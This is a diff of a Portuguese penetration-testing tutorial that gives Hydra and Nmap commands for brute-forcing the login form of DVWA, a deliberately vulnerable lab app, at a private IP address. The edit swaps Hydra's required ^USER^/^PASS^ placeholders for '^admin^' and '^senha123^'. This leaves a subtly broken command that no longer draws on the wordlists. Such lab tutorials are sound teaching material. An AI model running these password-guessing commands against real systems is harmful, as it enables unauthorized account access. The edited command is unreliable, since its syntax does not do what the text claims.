@@ -87,7 +87,7 @@ Como a ferramenta Medusa não é eficaz em testes de autenticação do tipo Web 
 
 Hydra: Para realizarmos o ataque com a ferramenta Hydra, utilizaremos o comando
 
-hydra -L users.txt -P passwords.txt 192.168.219.3 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 6
+hydra -L users.txt -P passwords.txt 192.168.219.3 http-post-form "/dvwa/login.php:username=^admin^&password=^senha123^&Login=Login:Login failed" -t 6
 Nmap: Já para o ataque com o Nmap, utilizaremos o comando
 
 nmap 192.168.219.3 --script http-form-brute --script-args userdb=users.txt,passdb=passwords.txt,path=/dvwa/login.php -p 80
